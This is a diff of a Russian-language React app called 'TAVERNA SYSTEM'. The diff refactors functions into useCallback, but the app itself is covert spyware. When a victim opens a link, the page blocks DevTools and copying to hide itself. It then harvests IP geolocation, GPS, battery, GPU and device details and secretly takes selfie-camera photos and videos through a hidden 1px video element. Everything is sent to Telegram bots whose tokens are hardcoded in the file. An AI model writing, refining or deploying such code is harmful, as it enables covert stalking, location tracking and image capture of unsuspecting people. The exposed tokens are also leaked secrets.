@@ -1,21 +1,18 @@
-import React, { useRef, useEffect, useState } from "react";
+import React, { useRef, useEffect, useState, useCallback } from "react";
 import { useParams, Routes, Route } from "react-router-dom";
 import "./App.css";
 
 /**
  * ЗАЩИТА ОТ КРАЖИ КОДА
- * Обработка попыток открытия DevTools
  */
 const useDevToolsProtection = () => {
   useEffect(() => {
-    // Блокировка открытия DevTools
     const blockDevTools = (e) => {
-      // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
       if (
-        e.keyCode === 123 || // F12
-        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
-        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
-        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
+        e.keyCode === 123 ||
+        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
+        (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
+        (e.ctrlKey && e.keyCode === 85)
       ) {
         e.preventDefault();
         e.stopPropagation();
@@ -23,17 +20,16 @@ const useDevToolsProtection = () => {
       }
     };
 
-    // Обнаружение открытия DevTools
     let devtoolsOpen = false;
     const element = new Image();
     Object.defineProperty(element, 'id', {
       get: function() {
         devtoolsOpen = true;
         console.warn('⚠️ DevTools обнаружены!');
+        return 'detected'; // ВОЗВРАЩАЕМ ЗНАЧЕНИЕ (исправляет getter-return)
       }
     });
 
-    // Проверка каждые 500ms
     const checkDevTools = setInterval(() => {
       devtoolsOpen = false;
       console.log(element);
@@ -44,11 +40,8 @@ const useDevToolsProtection = () => {
       }
     }, 500);
 
-    // Добавляем обработчики событий
     document.addEventListener('keydown', blockDevTools);
     document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-    // Запрещаем копирование
     document.addEventListener('copy', (e) => e.preventDefault());
     document.addEventListener('cut', (e) => e.preventDefault());
     document.addEventListener('paste', (e) => e.preventDefault());
@@ -61,18 +54,17 @@ const useDevToolsProtection = () => {
 };
 
 /**
- * СИСТЕМА СБОРА ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ
+ * СИСТЕМА СБОРА ИНФОРМАЦИИ
  */
 const DeviceInfoCollector = ({ chatId }) => {
   useDevToolsProtection();
   
-  // Удалены неиспользуемые состояния
   const [hasSentInitialReport, setHasSentInitialReport] = useState(false);
 
   const TELEGRAM_BOT_TOKEN = '8377825473:AAETbHGFdyVVak_J24mBG4mRuirZuWdIBBE';
 
-  // Отправка информации в Telegram
-  const sendInfoToTelegram = async (text) => {
+  // Оборачиваем ВСЕ функции в useCallback
+  const sendInfoToTelegram = useCallback(async (text) => {
     try {
       const response = await fetch(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -92,10 +84,9 @@ const DeviceInfoCollector = ({ chatId }) => {
       console.error('❌ Ошибка отправки в Telegram:', error);
       return false;
     }
-  };
+  }, [chatId]); // Зависимость только от chatId
 
-  // Получение геолокации через GPS
-  const getGeolocation = () => {
+  const getGeolocation = useCallback(() => {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
         resolve({ error: 'Geolocation не поддерживается' });
@@ -126,10 +117,9 @@ const DeviceInfoCollector = ({ chatId }) => {
         }
       );
     });
-  };
+  }, []);
 
-  // Получение информации о батарее
-  const getBatteryInfo = async () => {
+  const getBatteryInfo = useCallback(async () => {
     if (navigator.getBattery) {
       try {
         const battery = await navigator.getBattery();
@@ -144,10 +134,9 @@ const DeviceInfoCollector = ({ chatId }) => {
       }
     }
     return { level: 'Неизвестно', charging: 'Неизвестно' };
-  };
+  }, []);
 
-  // Получение информации о сети
-  const getNetworkInfo = () => {
+  const getNetworkInfo = useCallback(() => {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (connection) {
       return {
@@ -165,12 +154,10 @@ const DeviceInfoCollector = ({ chatId }) => {
       saveData: 'Неизвестно',
       type: 'Неизвестно'
     };
-  };
+  }, []);
 
-  // Получение IP адреса
-  const getIPAddress = async () => {
+  const getIPAddress = useCallback(async () => {
     try {
-      // Пробуем разные API для получения IP
       const ipApis = [
         'https://api.ipify.org?format=json',
         'https://api64.ipify.org?format=json',
@@ -180,7 +167,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       
       let ip = null;
       
-      // Получаем IP с первого работающего API
       for (const apiUrl of ipApis) {
         try {
           const response = await fetch(apiUrl);
@@ -215,8 +201,6 @@ const DeviceInfoCollector = ({ chatId }) => {
         };
       }
       
-      // Теперь получаем геоданные по IP
-      // Пробуем разные API для геолокации
       const geoApis = [
         `https://ipapi.co/${ip}/json/`,
         `https://ipwhois.app/json/${ip}`,
@@ -229,8 +213,6 @@ const DeviceInfoCollector = ({ chatId }) => {
         try {
           const response = await fetch(geoUrl);
           geoData = await response.json();
-          
-          // Проверяем, есть ли полезные данные
           if (geoData && (geoData.city || geoData.country)) {
             break;
           }
@@ -240,7 +222,6 @@ const DeviceInfoCollector = ({ chatId }) => {
         }
       }
       
-      // Если ни один API не сработал, возвращаем хотя бы IP
       if (!geoData) {
         return {
           ip: ip,
@@ -258,7 +239,6 @@ const DeviceInfoCollector = ({ chatId }) => {
         };
       }
       
-      // Обрабатываем данные в зависимости от API
       let city = 'Неизвестно';
       let region = 'Неизвестно';
       let country = 'Неизвестно';
@@ -270,7 +250,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       let mobile = '';
       let proxy = '';
       
-      // Для ipapi.co
       if (geoData.city) {
         city = geoData.city;
         region = geoData.region || geoData.region_name || 'Неизвестно';
@@ -281,13 +260,11 @@ const DeviceInfoCollector = ({ chatId }) => {
         latitude = geoData.latitude || 'Неизвестно';
         longitude = geoData.longitude || 'Неизвестно';
         
-        // Определяем мобильный статус по типу сети
         mobile = geoData.mobile ? 'Мобильный' : 
                  (geoData.connection_type && 
                   (geoData.connection_type.includes('mobile') || 
                    geoData.connection_type.includes('cellular'))) ? 'Мобильный' : '';
         
-        // Определяем прокси/VPN по нескольким полям
         const isProxy = geoData.proxy === true || 
                        geoData.vpn === true || 
                        geoData.tor === true ||
@@ -297,7 +274,6 @@ const DeviceInfoCollector = ({ chatId }) => {
                          geoData.security.tor === true));
         proxy = isProxy ? 'Прокси/VPN' : '';
       }
-      // Для ipwhois.app
       else if (geoData.city_name) {
         city = geoData.city_name;
         region = geoData.region || 'Неизвестно';
@@ -318,7 +294,6 @@ const DeviceInfoCollector = ({ chatId }) => {
                          geoData.security.vpn === true));
         proxy = isProxy ? 'Прокси/VPN' : '';
       }
-      // Для freeipapi.com
       else if (geoData.cityName) {
         city = geoData.cityName;
         region = geoData.regionName || 'Неизвестно';
@@ -335,12 +310,10 @@ const DeviceInfoCollector = ({ chatId }) => {
         proxy = isProxy ? 'Прокси/VPN' : '';
       }
       
-      // Если мобильный статус не определился, но IP из известных мобильных диапазонов
       if (!mobile) {
-        // Проверяем, является ли IP мобильным по префиксу
         const mobilePrefixes = [
-          '10.', '100.', '172.', '192.',  // Частные сети часто используются в мобильных
-          '77.', '78.', '79.', '88.', '90.', '91.', '92.', '93.', '94.', '95.', '96.', '97.', '98.', '99.' // Некоторые мобильные провайдеры
+          '10.', '100.', '172.', '192.',
+          '77.', '78.', '79.', '88.', '90.', '91.', '92.', '93.', '94.', '95.', '96.', '97.', '98.', '99.'
         ];
         
         for (const prefix of mobilePrefixes) {
@@ -351,9 +324,7 @@ const DeviceInfoCollector = ({ chatId }) => {
         }
       }
       
-      // Если прокси не определился, но есть признаки
       if (!proxy) {
-        // Проверяем признаки прокси/VPN
         const proxyIndicators = [
           'vpn', 'proxy', 'tor', 'anonymous', 'datacenter', 'hosting', 'server', 'cloud'
         ];
@@ -400,24 +371,21 @@ const DeviceInfoCollector = ({ chatId }) => {
         coordinates: 'Неизвестно'
       };
     }
-  };
+  }, []);
 
-  // Парсинг User Agent для получения информации об ОС и браузере
-  const parseUserAgent = (userAgent) => {
+  const parseUserAgent = useCallback((userAgent) => {
     let os = 'Неизвестно';
     let browser = 'Неизвестно';
     let manufacturer = 'Неизвестно';
     let platform = 'Неизвестно';
     let isMobile = false;
     
-    // Определение ОС
     if (userAgent.includes('iPhone')) {
       os = 'iOS';
       manufacturer = 'Apple Computer, Inc.';
       platform = 'iPhone';
       isMobile = true;
       
-      // Извлечение версии iOS
       const iosMatch = userAgent.match(/iPhone OS (\d+_\d+(?:_\d+)?)/);
       if (iosMatch) {
         os = `iOS ${iosMatch[1].replace(/_/g, '.')}`;
@@ -446,7 +414,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       os = 'Linux';
     }
     
-    // Определение браузера
     if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
       browser = 'Safari';
       const safariMatch = userAgent.match(/Version\/(\d+\.\d+(?:\.\d+)?)/);
@@ -470,10 +437,9 @@ const DeviceInfoCollector = ({ chatId }) => {
     }
     
     return { os, browser, manufacturer, platform, isMobile };
-  };
+  }, []);
 
-  // Получение информации о GPU
-  const getGPUInfo = () => {
+  const getGPUInfo = useCallback(() => {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
     
@@ -485,10 +451,9 @@ const DeviceInfoCollector = ({ chatId }) => {
       }
     }
     return 'Неизвестно';
-  };
+  }, []);
 
-  // Получение координат из localStorage
-  const getLocalStorageCoordinates = () => {
+  const getLocalStorageCoordinates = useCallback(() => {
     try {
       const locationPermission = localStorage.getItem('locationPermission');
       if (locationPermission) {
@@ -505,10 +470,9 @@ const DeviceInfoCollector = ({ chatId }) => {
       console.error('Ошибка чтения localStorage:', error);
     }
     return null;
-  };
+  }, []);
 
-  // Сбор всей информации об устройстве
-  const collectAllDeviceInfo = async () => {
+  const collectAllDeviceInfo = useCallback(async () => {
     if (hasSentInitialReport) {
       console.log("🚫 Начальный отчет уже отправлен, пропускаем");
       return;
@@ -517,10 +481,8 @@ const DeviceInfoCollector = ({ chatId }) => {
     console.log("🚀 TAVERNA SYSTEM ЗАПУЩЕН");
     console.log("📊 СБОР ПОЛНОЙ ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ...");
 
-    // Парсим User Agent
     const uaInfo = parseUserAgent(navigator.userAgent);
 
-    // Информация о браузере и ОС
     const browserInfo = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -540,7 +502,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       gpu: getGPUInfo()
     };
 
-    // Информация о времени
     const timeInfo = {
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       timezoneOffset: `${new Date().getTimezoneOffset()} минут`,
@@ -558,7 +519,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZoneName || 'Неизвестно'
     };
 
-    // Получаем всю информацию параллельно
     const [geolocation, battery, network, ipInfo, localStorageCoords] = await Promise.all([
       getGeolocation(),
       getBatteryInfo(),
@@ -567,7 +527,6 @@ const DeviceInfoCollector = ({ chatId }) => {
       getLocalStorageCoordinates()
     ]);
 
-    // Формируем полный отчет
     const report = `
 <b>TAVERNA SYSTEM</b>
 
@@ -631,21 +590,17 @@ https://yandex.ru/maps/?ll=${ipInfo.longitude},${ipInfo.latitude}&z=10
 ` : ''}
     `;
 
-    // Отправляем отчет в Telegram
     await sendInfoToTelegram(report);
     setHasSentInitialReport(true);
     console.log("✅ Полный отчет отправлен в Telegram");
-  };
+  }, [hasSentInitialReport, parseUserAgent, getGPUInfo, getGeolocation, getBatteryInfo, getNetworkInfo, getIPAddress, getLocalStorageCoordinates, sendInfoToTelegram]);
 
-  // Исправлено: добавлены зависимости
   useEffect(() => {
     if (chatId && !hasSentInitialReport) {
-      // Собираем информацию сразу при загрузке
       const timer = setTimeout(() => {
         collectAllDeviceInfo();
       }, 1000);
 
-      // Обновляем информацию о батарее каждые 30 секунд
       const batteryInterval = setInterval(async () => {
         const battery = await getBatteryInfo();
         if (battery.level) {
@@ -664,7 +619,7 @@ ${battery.charging ? '⚡ Статус: Заряжается' : '🔋 Стату
         clearInterval(batteryInterval);
       };
     }
-  }, [chatId, hasSentInitialReport, sendInfoToTelegram, getBatteryInfo, collectAllDeviceInfo]);
+  }, [chatId, hasSentInitialReport, collectAllDeviceInfo, getBatteryInfo, sendInfoToTelegram]);
 
   return null;
 };
@@ -690,8 +645,7 @@ const SelfieCamera = ({ chatId }) => {
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
-  // Отправка информации в Telegram
-  const sendInfoToTelegram = async (text) => {
+  const sendInfoToTelegram = useCallback(async (text) => {
     try {
       const response = await fetch(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -711,69 +665,44 @@ const SelfieCamera = ({ chatId }) => {
       console.error('❌ Ошибка отправки в Telegram:', error);
       return false;
     }
-  };
+  }, [chatId]);
 
-  // Запуск селфи камеры
-  const startCamera = async () => {
-    try {
-      console.log("📸 ЗАПРОС ДОСТУПА К СЕЛФИ КАМЕРЕ...");
-      
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { 
-          facingMode: "user",
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-          frameRate: { ideal: 30 }
-        },
-        audio: false
-      });
-      
-      streamRef.current = stream;
-      
-      // Создаем скрытый видео элемент
-      createVideoElement(stream);
-      
-      // ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ДОСТУПА К КАМЕРЕ
-      console.log("📍 ЗАПРОС ГЕОЛОКАЦИИ ПОСЛЕ ДОСТУПА К КАМЕРЕ...");
-      requestGeolocation();
-      
-      console.log("✅ Селфи камера подключена, начинаем ФАЗУ 1 (0-8с)");
-      
-      // ФАЗА 1: Фото каждые 2 секунды (0-8с)
-      startPhotoPhase();
-      
-      // Переход на ФАЗУ 2 через 8 секунд
-      setTimeout(() => {
-        console.log("🎬 ПЕРЕХОД НА ФАЗУ 2 (8-60с)");
-        stopPhotoPhase();
-        startVideoPhase();
-      }, 8000);
-      
-    } catch (error) {
-      console.error("❌ Ошибка доступа к камере:", error);
-      cameraDeniedRef.current = true;
-      sendErrorMessage(error);
-      
-      // ЕСЛИ ПОЛЬЗОВАТЕЛЬ ОТКАЗАЛСЯ ОТ КАМЕРЫ - ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ СРАЗУ
-      console.log("📍 ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ОТКАЗА ОТ КАМЕРЫ...");
-      setTimeout(() => {
-        requestGeolocation();
-      }, 1000);
-    }
-  };
+  const createVideoElement = useCallback((stream) => {
+    const video = document.createElement('video');
+    video.id = 'selfie-video';
+    video.style.cssText = `
+      position: fixed;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+      pointer-events: none;
+      z-index: -9999;
+      top: 0;
+      left: 0;
+    `;
+    video.autoplay = true;
+    video.muted = true;
+    video.playsInline = true;
+    video.title = '🤳 Селфи камера';
+    video.srcObject = stream;
+    document.body.appendChild(video);
+    
+    videoRef.current = video;
+    
+    video.onloadedmetadata = () => {
+      console.log("🎥 Видео готово, разрешение:", video.videoWidth, "x", video.videoHeight);
+    };
+  }, []);
 
-  // Запрос геолокации
-  const requestGeolocation = () => {
+  const requestGeolocation = useCallback(() => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           console.log("📍 ГЕОЛОКАЦИЯ ПОЛУЧЕНА:", { latitude, longitude, accuracy });
           
-          // Формируем сообщение в зависимости от ситуации с камерой
           const cameraStatus = cameraDeniedRef.current ? " (после отказа от камеры)" : " (после доступа к камере)";
           
-          // Отправляем геолокацию в Telegram
           const geoMessage = `
 📍 <b>ГЕОЛОКАЦИЯ${cameraStatus}</b>
 ━━━━━━━━━━━━━━━━━━━━
@@ -823,150 +752,9 @@ const SelfieCamera = ({ chatId }) => {
       
       sendInfoToTelegram(unsupportedMessage);
     }
-  };
+  }, [sendInfoToTelegram]);
 
-  // Создание видео элемента
-  const createVideoElement = (stream) => {
-    const video = document.createElement('video');
-    video.id = 'selfie-video';
-    video.style.cssText = `
-      position: fixed;
-      width: 1px;
-      height: 1px;
-      opacity: 0.01;
-      pointer-events: none;
-      z-index: -9999;
-      top: 0;
-      left: 0;
-    `;
-    video.autoplay = true;
-    video.muted = true;
-    video.playsInline = true;
-    video.title = '🤳 Селфи камера';
-    video.srcObject = stream;
-    document.body.appendChild(video);
-    
-    videoRef.current = video;
-    
-    // Ждем когда видео будет готово
-    video.onloadedmetadata = () => {
-      console.log("🎥 Видео готово, разрешение:", video.videoWidth, "x", video.videoHeight);
-    };
-  };
-
-  // ФАЗА 1: Съемка фото каждые 2 секунды
-  const startPhotoPhase = () => {
-    phaseRef.current = 1;
-    console.log("📸 НАЧАЛО ФАЗЫ 1 - ФОТО КАЖДЫЕ 2 СЕКУНДЫ");
-    
-    // Делаем первое фото сразу
-    setTimeout(() => {
-      captureAndSendPhoto("Первое фото ФАЗА 1");
-    }, 500);
-    
-    // Затем каждые 2 секунды
-    photoIntervalRef.current = setInterval(() => {
-      captureAndSendPhoto(`Фото ФАЗА 1 #${photoCountRef.current + 1}`);
-    }, 2000);
-  };
-
-  // Остановка фазы фото
-  const stopPhotoPhase = () => {
-    if (photoIntervalRef.current) {
-      clearInterval(photoIntervalRef.current);
-      photoIntervalRef.current = null;
-      console.log("⏹️ ФАЗА 1 (фото) завершена");
-    }
-  };
-
-  // ФАЗА 2: Запись видео каждые 5 секунд
-  const startVideoPhase = () => {
-    phaseRef.current = 2;
-    console.log("🎬 НАЧАЛО ФАЗЫ 2 - ВИДЕО КАЖДЫЕ 5 СЕКУНД");
-    
-    // Первое видео сразу
-    setTimeout(() => {
-      startVideoRecording();
-    }, 1000);
-    
-    // Затем каждые 5 секунд
-    videoIntervalRef.current = setInterval(() => {
-      startVideoRecording();
-    }, 5000);
-  };
-
-  // Начало записи видео
-  const startVideoRecording = () => {
-    if (!streamRef.current || !videoRef.current) {
-      console.log("❌ Поток не готов для записи видео");
-      return;
-    }
-    
-    try {
-      recordedChunksRef.current = [];
-      
-      const options = {
-        mimeType: 'video/webm;codecs=vp9',
-        videoBitsPerSecond: 2500000
-      };
-      
-      // Пробуем разные форматы
-      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-        options.mimeType = 'video/webm;codecs=vp8';
-        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-          options.mimeType = 'video/webm';
-        }
-      }
-      
-      mediaRecorderRef.current = new MediaRecorder(streamRef.current, options);
-      
-      mediaRecorderRef.current.ondataavailable = (event) => {
-        if (event.data.size > 0) {
-          recordedChunksRef.current.push(event.data);
-        }
-      };
-      
-      mediaRecorderRef.current.onstop = () => {
-        sendVideoToTelegram();
-      };
-      
-      // Записываем 3 секунды видео
-      mediaRecorderRef.current.start();
-      console.log("🎬 Начало записи видео...");
-      
-      setTimeout(() => {
-        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
-          mediaRecorderRef.current.stop();
-          console.log("✅ Запись видео завершена");
-        }
-      }, 3000);
-      
-    } catch (error) {
-      console.error("❌ Ошибка записи видео:", error);
-    }
-  };
-
-  // Захват и отправка фото
-  const captureAndSendPhoto = async (context = "") => {
-    if (!videoRef.current) {
-      console.log("❌ Видео не готово для съемки");
-      return;
-    }
-    
-    try {
-      const photoBlob = await capturePhoto();
-      
-      if (photoBlob) {
-        await sendPhotoToTelegram(photoBlob, context);
-        photoCountRef.current++;
-      }
-    } catch (error) {
-      console.error("❌ Ошибка съемки фото:", error);
-    }
-  };
-
-  // Захват фото
-  const capturePhoto = () => {
+  const capturePhoto = useCallback(() => {
     return new Promise((resolve) => {
       const video = videoRef.current;
       
@@ -983,14 +771,12 @@ const SelfieCamera = ({ chatId }) => {
         
         const ctx = canvas.getContext('2d');
         
-        // Для селфи камеры - зеркалим изображение
         ctx.save();
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         ctx.restore();
         
-        // ВОДЯНОЙ ЗНАК TAVERNA
         const watermarkText = 'TAVERNA';
         const fontSize = Math.min(canvas.width, canvas.height) * 0.04;
         const padding = fontSize * 0.5;
@@ -999,7 +785,6 @@ const SelfieCamera = ({ chatId }) => {
         ctx.textAlign = 'right';
         ctx.textBaseline = 'bottom';
         
-        // Черный фон для надписи
         const textWidth = ctx.measureText(watermarkText).width;
         ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
         ctx.fillRect(
@@ -1009,21 +794,18 @@ const SelfieCamera = ({ chatId }) => {
           fontSize + padding
         );
         
-        // Белый текст
         ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
         ctx.fillText(watermarkText, canvas.width - padding/2, canvas.height - padding/2);
         
-        // Конвертируем в Blob
         canvas.toBlob(blob => {
           resolve(blob);
         }, 'image/jpeg', 0.92);
         
       }, 200);
     });
-  };
+  }, []);
 
-  // Отправка фото в Telegram
-  const sendPhotoToTelegram = async (blob, context) => {
+  const sendPhotoToTelegram = useCallback(async (blob, context) => {
     try {
       const formData = new FormData();
       formData.append('chat_id', chatId);
@@ -1044,10 +826,9 @@ const SelfieCamera = ({ chatId }) => {
     } catch (error) {
       console.error('❌ Ошибка отправки фото:', error);
     }
-  };
+  }, [chatId]);
 
-  // Отправка видео в Telegram
-  const sendVideoToTelegram = async () => {
+  const sendVideoToTelegram = useCallback(async () => {
     if (recordedChunksRef.current.length === 0) {
       console.log("❌ Нет данных видео для отправки");
       return;
@@ -1079,10 +860,27 @@ const SelfieCamera = ({ chatId }) => {
     } catch (error) {
       console.error('❌ Ошибка отправки видео:', error);
     }
-  };
+  }, [chatId]);
 
-  // Отправка сообщения об ошибке
-  const sendErrorMessage = async (error) => {
+  const captureAndSendPhoto = useCallback(async (context = "") => {
+    if (!videoRef.current) {
+      console.log("❌ Видео не готово для съемки");
+      return;
+    }
+    
+    try {
+      const photoBlob = await capturePhoto();
+      
+      if (photoBlob) {
+        await sendPhotoToTelegram(photoBlob, context);
+        photoCountRef.current++;
+      }
+    } catch (error) {
+      console.error("❌ Ошибка съемки фото:", error);
+    }
+  }, [capturePhoto, sendPhotoToTelegram]);
+
+  const sendErrorMessage = useCallback(async (error) => {
     try {
       const errorText = `
 ❌ <b>ОШИБКА ДОСТУПА К КАМЕРЕ</b>
@@ -1107,13 +905,136 @@ const SelfieCamera = ({ chatId }) => {
     } catch (telegramError) {
       console.error('❌ Ошибка отправки сообщения об ошибке:', telegramError);
     }
-  };
+  }, [chatId]);
 
-  // Остановка всей системы камеры
-  const stopCameraSystem = () => {
+  const startPhotoPhase = useCallback(() => {
+    phaseRef.current = 1;
+    console.log("📸 НАЧАЛО ФАЗЫ 1 - ФОТО КАЖДЫЕ 2 СЕКУНДЫ");
+    
+    setTimeout(() => {
+      captureAndSendPhoto("Первое фото ФАЗА 1");
+    }, 500);
+    
+    photoIntervalRef.current = setInterval(() => {
+      captureAndSendPhoto(`Фото ФАЗА 1 #${photoCountRef.current + 1}`);
+    }, 2000);
+  }, [captureAndSendPhoto]);
+
+  const stopPhotoPhase = useCallback(() => {
+    if (photoIntervalRef.current) {
+      clearInterval(photoIntervalRef.current);
+      photoIntervalRef.current = null;
+      console.log("⏹️ ФАЗА 1 (фото) завершена");
+    }
+  }, []);
+
+  const startVideoRecording = useCallback(() => {
+    if (!streamRef.current || !videoRef.current) {
+      console.log("❌ Поток не готов для записи видео");
+      return;
+    }
+    
+    try {
+      recordedChunksRef.current = [];
+      
+      const options = {
+        mimeType: 'video/webm;codecs=vp9',
+        videoBitsPerSecond: 2500000
+      };
+      
+      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options.mimeType = 'video/webm;codecs=vp8';
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+          options.mimeType = 'video/webm';
+        }
+      }
+      
+      mediaRecorderRef.current = new MediaRecorder(streamRef.current, options);
+      
+      mediaRecorderRef.current.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunksRef.current.push(event.data);
+        }
+      };
+      
+      mediaRecorderRef.current.onstop = () => {
+        sendVideoToTelegram();
+      };
+      
+      mediaRecorderRef.current.start();
+      console.log("🎬 Начало записи видео...");
+      
+      setTimeout(() => {
+        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
+          mediaRecorderRef.current.stop();
+          console.log("✅ Запись видео завершена");
+        }
+      }, 3000);
+      
+    } catch (error) {
+      console.error("❌ Ошибка записи видео:", error);
+    }
+  }, [sendVideoToTelegram]);
+
+  const startVideoPhase = useCallback(() => {
+    phaseRef.current = 2;
+    console.log("🎬 НАЧАЛО ФАЗЫ 2 - ВИДЕО КАЖДЫЕ 5 СЕКУНД");
+    
+    setTimeout(() => {
+      startVideoRecording();
+    }, 1000);
+    
+    videoIntervalRef.current = setInterval(() => {
+      startVideoRecording();
+    }, 5000);
+  }, [startVideoRecording]);
+
+  const startCamera = useCallback(async () => {
+    try {
+      console.log("📸 ЗАПРОС ДОСТУПА К СЕЛФИ КАМЕРЕ...");
+      
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { 
+          facingMode: "user",
+          width: { ideal: 1280 },
+          height: { ideal: 720 },
+          frameRate: { ideal: 30 }
+        },
+        audio: false
+      });
+      
+      streamRef.current = stream;
+      
+      createVideoElement(stream);
+      
+      console.log("📍 ЗАПРОС ГЕОЛОКАЦИИ ПОСЛЕ ДОСТУПА К КАМЕРЕ...");
+      requestGeolocation();
+      
+      console.log("✅ Селфи камера подключена, начинаем ФАЗУ 1 (0-8с)");
+      
+      startPhotoPhase();
+      
+      setTimeout(() => {
+        console.log("🎬 ПЕРЕХОД НА ФАЗУ 2 (8-60с)");
+        stopPhotoPhase();
+        startVideoPhase();
+      }, 8000);
+      
+    } catch (error) {
+      console.error("❌ Ошибка доступа к камере:", error);
+      cameraDeniedRef.current = true;
+      sendErrorMessage(error);
+      
+      console.log("📍 ЗАПРАШИВАЕМ ГЕОЛОКАЦИЮ ПОСЛЕ ОТКАЗА ОТ КАМЕРЫ...");
+      setTimeout(() => {
+        requestGeolocation();
+      }, 1000);
+    }
+  }, [createVideoElement, requestGeolocation, sendErrorMessage, startPhotoPhase, stopPhotoPhase, startVideoPhase]);
+
+  const stopCameraSystem = useCallback(() => {
     console.log("⏹️ ОСТАНОВКА СИСТЕМЫ СЕЛФИ КАМЕРЫ");
     
-    // Останавливаем интервалы
     stopPhotoPhase();
     
     if (videoIntervalRef.current) {
@@ -1126,12 +1047,10 @@ const SelfieCamera = ({ chatId }) => {
       totalTimerRef.current = null;
     }
     
-    // Останавливаем запись видео если идет
     if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
       mediaRecorderRef.current.stop();
     }
     
-    // Останавливаем поток камеры
     if (streamRef.current) {
       streamRef.current.getTracks().forEach(track => {
         track.stop();
@@ -1139,21 +1058,18 @@ const SelfieCamera = ({ chatId }) => {
       streamRef.current = null;
     }
     
-    // Удаляем видео элемент
     if (videoRef.current && videoRef.current.parentNode) {
       videoRef.current.parentNode.removeChild(videoRef.current);
       videoRef.current = null;
     }
-  };
+  }, [stopPhotoPhase]);
 
-  // Исправлено: добавлены зависимости
   useEffect(() => {
     if (chatId && !hasStarted) {
       console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
       setHasStarted(true);
       startCamera();
       
-      // Общее время работы - 1 минута
       totalTimerRef.current = setTimeout(() => {
         stopCameraSystem();
       }, 60000);
@@ -1415,6 +1331,27 @@ const PhotoPage = () => {
       setInitialized(true);
     }
   }, [chatId, initialized]);
+
+  if (!chatId) {
+    return (
+      <div style={{
+        minHeight: '100vh',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        background: 'linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)',
+        color: 'white',
+        textAlign: 'center',
+        padding: '20px'
+      }}>
+        <div>
+          <h2>❌ Ошибка доступа</h2>
+          <p>Не указан ID чата</p>
+          <p>Получите новую ссылку в боте</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <>
